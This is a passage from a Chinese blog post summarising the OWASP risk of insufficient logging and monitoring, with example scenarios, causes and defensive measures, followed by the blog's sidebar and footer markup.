<li>场景#1<br>一个由小团队运营的开源项目论坛软件被攻击者利用其<br>内在漏洞攻陷了。 攻击者设法删除了包含下一个版本的内部源代<br>码仓库以及所有论坛内容。 虽然代码可以恢复，但由于缺乏监控、<br>日志记录和告警导致了更糟糕的结果。 由于此问题，该论坛软件<br>项目不再活跃。</li>
<li>场景#2<br>攻击者使用通用密码进行用户扫描并能获取所有使用此<br>密码的账户。对于其他账户而言，将仅有一次失败的登陆尝试记<br>录。一段时间以后，攻击者可以用另一个密码再次进行此活动。</li>
<li>场景#3<br>美国的一家大型零售商据内部使用恶意软件分析沙箱做<br>分析。 沙箱软件检测到了一些可能不需要的软件，但没有人响应<br>此次检测。 在一个境外银行不正当的信用卡交易被检测到之前，<br>该沙箱软件一直在产生告警信息<h3 id="产生原因-9"><a href="#产生原因-9" class="headerlink" title="产生原因"></a>产生原因</h3></li>
<li>未记录可审计性事件，如：登录、登录失败和高额交易。</li>
<li>告警和错误事件未能产生或产生不足的和不清晰的日志信息。</li>
<li>没有利用应用系统和API的日志信息来监控可疑活动。</li>
<li>日志信息仅在本地存储。</li>
<li>没有定义合理的告警阈值和制定响应处理流程。</li>
<li>渗透测试和使用DAST工具（如：OWASP ZAP）扫描没有触<br>发告警</li>
<li>对于实时或准实时的攻击，应用程序无法检测、处理和告警<h3 id="防止-9"><a href="#防止-9" class="headerlink" title="防止"></a>防止</h3></li>
<li>确保所有登录、访问控制失败、输入验证失败能够被记录到日<br>志中去，并保留足够的用户上下文信息，以识别可疑或恶意帐<br>户，并为后期取证预留足够时间。</li>
<li>确保日志以一种能被集中日志管理解决方案使用的形式生成</li>
<li>确保高额交易有完整性控制的审计信息，以防止篡改或删除，<br>例如审计信息保存在只能进行记录增加的数据库表中。</li>
<li>建立有效的监控和告警机制，使可疑活动在可接受的时间内被<br>发现和应对。</li>
<li>建立或采取一个应急响应机制和恢复计划，例如：NIST 800-<br>61 rev 2或更新版本</li>
</ul>
</div><div class="tags"></div><div class="post-nav"><a class="pre" href="/2018/02/02/DVWA学习笔记/">DVWA学习笔记</a><a class="next" href="/2018/01/31/实验吧CTF题库-web安全Writeup/">实验吧CTF题库-web安全Writeup</a></div><div id="SOHUCS" sid="1517414235000"></div><script>(function(){var appid='cytTB77q5';var conf='';var width=window.innerWidth||document.documentElement.clientWidth;if(width<960){window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id='+appid+'&conf='+conf+'"><\/script>')}else{var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})})}})()
</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://blog.xhzyxed.cn"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/408/">408</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Nginx/">Nginx</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Redis/">Redis</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/docker/">docker</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/git/">git</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/http/">http</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/javascript/">javascript</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/memcached/">memcached</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/mysql/">mysql</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/php/">php</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/vuejs/">vuejs</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/前端构建工具/">前端构建工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/推文/">推文</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/项目/">项目</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/11/01/nosql学习汇总/">nosql学习汇总</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/31/deployer的使用报告/">deployer的使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/20/laravel学习之Response/">laravel学习之Response</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/20/laravel学习之Request/">laravel学习之Request</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/17/laravel学习之路由/">laravel学习之路由</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/14/laravel学习之中间件/">laravel学习之中间件</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/11/laravel学习之Facades/">laravel学习之Facades</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/10/laravel学习之服务提供者/">laravel学习之服务提供者</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/09/laravel学习之服务容器/">laravel学习之服务容器</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/09/laravel请求到响应的整个过程/">laravel请求到响应的整个过程</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://org.xhzyxed.cn/" title="小猴子与小耳朵" target="_blank">小猴子与小耳朵</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2018 <a href="/." rel="nofollow">其斤.匕禾页.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>